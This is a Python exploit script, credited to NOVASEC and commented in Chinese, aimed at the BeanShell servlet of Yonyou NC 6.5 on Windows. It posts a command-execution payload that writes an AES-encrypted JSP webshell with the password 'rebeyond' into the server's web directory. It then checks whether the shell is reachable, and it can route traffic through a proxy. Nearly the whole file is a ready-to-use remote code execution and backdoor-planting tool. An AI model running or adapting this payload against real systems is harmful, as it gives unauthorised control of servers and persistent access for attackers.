# -*- coding: UTF-8 -*- 
import requests
import random
import time
requests.packages.urllib3.disable_warnings()
import argparse
#from hyper.contrib import HTTP20Adapter #不支持HTTP2

def getShellName(randomlength=6):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]
    ShellName =  random_str + '.jsp'
    return ShellName

def nc_Getshell(target, shell , proxy):
    host = ''
    path = '' 
    if 'bsh.servlet.BshServlet'  in target:
        target = target.split("/servlet/~ic/bsh.servlet.BshServlet")[0] #http://IP:Port/Path
    host = target.split('://')[-1].strip('/')   #IP:Port/Path
    if '/' in host:
        host = target.split('/',1)[0] #IP:Port
        path = target.split('/',1)[-1] #Path
    print('==========================' )
    print('target: ',target)
    print('host: ',host)
    print('path: ',path)
    
        #代理设置
    if proxy != None:
        if 'http'  in proxy:
            proxies = {'http': proxy.replace('https:','http:') , 'https':  proxy.replace('http:','https:') }
        elif 'sock'  in proxy:
            proxies = {'http': proxy , 'https':  proxy }
    else:
        proxies = {}
    
    #请求头设置
    headers = {
        "Origin":  target + "/servlet/~ic/bsh.servlet.BshServlet" , 
        "Cookie": "JSESSIONID=4D712778B648964E291866B9877D82EF.server", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE', 
        "Referer":   target + "/servlet/~ic/bsh.servlet.BshServlet" , 
        "Connection": "close", 
        "Host": host ,
        "DNT": "1", 
        "Accept-Encoding": "gzip, deflate", 
        "Cache-Control": "max-age=0", 
        "Upgrade-Insecure-Requests": "1", 
        "Accept-Language": "zh-CN,zh;q=0.9", 
        "Content-Length": "881", 
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print('==========================' )
    #目标地址位置
    vulnpath =  target + "/servlet/~ic/bsh.servlet.BshServlet"
    print('vulnpath: ',vulnpath)
    print('==========================' )
   #shell脚本名字设置
    if shell == None: 
        shellName = getShellName() 
    else:
       shellName = shell
    shellUrl = (target + '/' + shellName) 
    print('''[+]预计生成shell地址:{} >> passwd: rebeyond'''.format(shellUrl))
    print('==========================' )
    print('构建 Post data ...')
    #data = r'''bsh.script=ex\u0065c("cmd /c echo \"<%25@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%25><%25!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%25><%25if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%25>\" > ''' + '''webapps/nc_web/{shellName}");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'''.format(shellName=shellName)
    data = "bsh.script=exec%28%22cmd+%2Fc+echo+%5C%22%3E%3C%25%40page+import%3D%5C%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%5C%22%25%3E%3C%25%21class+U+extends+ClassLoader%7BU%28ClassLoader+c%29%7Bsuper%28c%29%3B%7Dpublic+Class+g%28byte+%5B%5Db%29%7Breturn+super.defineClass%28b%2C0%2Cb.length%29%3B%7D%7D%25%3E%3C%25if+%28request.getMethod%28%29.equals%28%5C%22POST%5C%22%29%29%7BString+k%3D%5C%22e45e329feb5d925b%5C%22%3Bsession.putValue%28%5C%22u%5C%22%2Ck%29%3BCipher+c%3DCipher.getInstance%28%5C%22AES%5C%22%29%3Bc.init%282%2Cnew+SecretKeySpec%28k.getBytes%28%29%2C%5C%22AES%5C%22%29%29%3Bnew+U%28this.getClass%28%29.getClassLoader%28%29%29.g%28c.doFinal%28new+sun.misc.BASE64Decoder%28%29.decodeBuffer%28request.getReader%28%29.readLine%28%29%29%29%29.newInstance%28%29.equals%28pageContext%29%3B%7D%25%3E%3C%5C%22+%3E+webapps%2Fnc_web%2F{shellName}%22%29%3B%0D%0A%0D%0A%0D%0A".format(shellName=shellName)
    print(data)
    print('==========================' )
    print('正在写入Shell...' )
    try:
        res = requests.post(vulnpath, data=data, headers=headers, proxies=proxies, verify=False)
    except Exception as e:
        print('写入Shell发生异常',e)
    time.sleep(1)
    print('==========================' )
    print('正在检测Shell是否成功...' )
    try:
        res = requests.get(shellUrl , headers=headers, proxies=proxies, verify=False)
        print('res.status_code: ' ,res.status_code )
        if res.status_code == 200:
            print('''[+]nc_Getshell shell地址:{} 写入成功'''.format(shellUrl))
        elif res.status_code == 404:
            print('''[+]nc_Getshell shell地址:{} 写入失败'''.format(shellUrl))
        elif res.status_code == 403:
            print('''[+]nc_Getshell shell地址:{} 访问被拦截'''.format(shellUrl))
        else:
            print('''[+]]nc_Getshell shell地址:{} 出现错误 , 请手动调试!!!'''.format(shellUrl))
    except Exception as e:
        print('检测shell发生异常',e)

if __name__ == '__main__':
    # 输入参数
    parser = argparse.ArgumentParser()
    parser.description = "NC 6.5 bsh.servlet.BshServlet Windows 写 Shell By NOVASEC !!!"
    parser.add_argument("-u", "--url", help="指定目标URL,简单支持全路径, Example: https://192.168.88.88:8088", default=None)
    #parser.add_argument("-f", "--file", help="指定目标文件", default=None )
    parser.add_argument("-s", "--shell", help="指定shell名称,默认随机6位字符", default=None)
    parser.add_argument("-p", "--proxy", help="指定代理地址,HTTPS代理或Socks5代理(pip install requests[socks]) , Example: https://127.0.0.1:8080 or socks5://127.0.0.1:1080", default=None)

    args = parser.parse_args()

    print('NC自动写webshell' )
    print("url:", args.url)
    #print("file:", args.file)
    print("shell:", args.shell)
    print("proxy:", args.proxy)
    if args.url != None:
        nc_Getshell(args.url ,args.shell , args.proxy)
    print('==========================' )
    
    
    